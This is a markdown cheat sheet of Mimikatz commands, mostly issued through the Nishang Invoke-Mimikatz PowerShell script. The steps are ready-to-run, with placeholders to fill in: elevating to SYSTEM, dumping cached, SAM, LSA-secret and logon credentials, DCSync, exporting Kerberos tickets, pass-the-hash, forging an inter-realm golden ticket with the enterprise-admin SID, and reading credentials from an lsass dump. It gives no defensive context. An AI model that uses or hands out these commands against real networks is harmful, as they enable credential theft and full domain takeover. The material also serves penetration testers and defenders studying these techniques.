### Source 
https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1  
https://github.com/gentilkiwi/mimikatz  

### Elevate to system ("token::revert" to drop token)
```
Invoke-Mimikatz -Command '"token::elevate"'
```

### Dump credentials
```
Domain Cached Credential - "lsadump::cache"
Security Hives - "lsadump::sam"
Machine Accounts "lsadump::secrets"
Local Security Authority Substem Service - "sekurlsa::logonPasswords full"
Data Protection API - "vault::cred"
```

### Execute DCSync for single user
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;user&gt;"'
```

### Export all tickets from memory
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;ntlmHash&gt;"'
```

### Inter realm golden ticket - can be done offline, since domain controller connection is not necessary (/endin = validity period 60 minutes, /user can be fictitious, -519 is the SID of enteprise admin)
```
Invoke-Mimikatz -Command '"kerberos::golden /user:&lt;attackerAccount&gt; /domain:&lt;compromisedDomain&gt; /sid:&lt;sidCompromisedDomain&gt; /sids:&lt;sidTargetDomain&gt;-519 /krbtgt:&lt;ntlmHashKrbTgt&gt; /endin:60"'
```

### Dump credentials from lsass dump
```
mimikatz.exe
mimi&gt; sekurlsa::minidump &lt;file&gt;.dmp
mimi&gt; sekurlsa::logonPasswords full
```

### Write output of command to file
```
mimi&gt; log &lt;file&gt;.txt
```


